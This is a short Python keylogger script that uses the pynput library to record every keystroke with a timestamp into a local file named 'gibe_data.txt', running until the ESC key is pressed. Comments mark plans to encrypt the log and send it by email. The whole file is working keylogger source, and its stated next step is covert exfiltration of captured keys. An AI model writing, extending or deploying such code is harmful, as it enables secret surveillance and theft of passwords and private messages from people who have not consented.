# Libs
from pynput.keyboard import Key, Listener
import os
import datetime

#TODO encrypt
#TODO send to email

count = 0
keys = []

# Make a log file
def write_file(keys):
    if os.path.exists('./gibe_data.txt'):
        with open('gibe_data.txt', 'a') as f:
            for key in keys:
                f.write(str(datetime.datetime.now()) + ": " + str(key) + '\n')

    else:
        with open('gibe_data.txt', 'w') as f:
            for key in keys:
                f.write(str(datetime.datetime.now()) + ": " + str(key) + '\n')


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # write the file every pressed button (I could define a interval)
    if count > 0:
        count = 0
        write_file(keys)
        keys = []


# If you press ESC it will stop the program
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
